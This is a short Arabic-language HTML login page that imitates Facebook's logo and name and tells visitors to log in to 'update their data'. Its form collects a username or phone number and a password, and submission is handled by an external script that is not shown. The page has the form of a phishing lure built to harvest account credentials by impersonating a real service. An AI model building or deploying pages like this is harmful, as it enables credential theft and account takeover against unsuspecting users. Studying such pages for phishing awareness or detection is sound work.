<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="theme-color" content="#f0f2f5">
<title>صفحة تسجيل الدخول</title>
<link rel="stylesheet" href="/static/style.css">
</head>
<body>
<main class="container">
  <div class="logo">
    
<svg xmlns="http://www.w3.org/2000/svg"
     viewBox="0 0 64 64"
     width="100"
     height="100">
  <rect width="64" height="64" rx="12" fill="#1877F2"/>
  <path
    d="M36.7 56V34.6h7.2l1.1-8.3h-8.3V21c0-2.4.7-4.1 4.2-4.1h4.5V9.5c-.8-.1-3.5-.3-6.7-.3-6.6 0-11.1 4-11.1 11.4v5.7h-7.4v8.3h7.4V56z"
    fill="#ffffff"/>
</svg>

  </div>
<p class="logo-subtitle">Facebook</p>
<h1 class="brand-title"> لتحديث بياناتك على فيسبوك قم بتسجل الدخول .</h1>
  <form id="demoForm">

    <input
      type="text"
      name="username"
      placeholder="أدخل إسم المستخدم أو رقم الهاتف"
      autocomplete="off"
      required
    >

    <input
      type="text"
      name="demo_value"
      placeholder="كلمة المرور"
      autocomplete="off"
      required
    >

    <button type="submit">تسجيل الدخول</button>

  </form>

  <div id="message"></div>

</main>

<script src="/static/app.js"></script>
</body>
</html>
